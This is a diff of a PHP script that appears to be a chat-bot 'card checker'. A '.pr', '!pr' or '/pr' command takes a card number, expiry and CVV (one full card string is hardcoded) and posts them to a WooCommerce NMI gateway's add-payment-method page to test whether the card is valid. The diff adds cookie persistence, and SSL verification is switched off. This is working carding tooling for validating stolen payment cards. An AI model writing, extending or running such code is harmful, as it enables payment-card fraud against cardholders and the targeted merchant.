@@ -474,9 +474,6 @@ fclose($fp);
 
 if (strpos($message, ".pr") === 0 || strpos($message, "!pr") === 0 || strpos($message, "/pr") === 0) {
 
-
-
-
 $lista = "5218071187489214|08|2028|796";
 
 //$lista = substr($message, 5);
@@ -515,6 +512,8 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=nmi_gateway_woocommerce_credit_card&wc-nmi-gateway-woocommerce-credit-card-account-number='.$cc.'&wc-nmi-gateway-woocommerce-credit-card-expiry='.$mes.'+%2F+'.$ano.'&wc-nmi-gateway-woocommerce-credit-card-csc='.$cvv.'&woocommerce-add-payment-method-nonce=9c4b4d45c8&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1');
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 $response = curl_exec($ch);
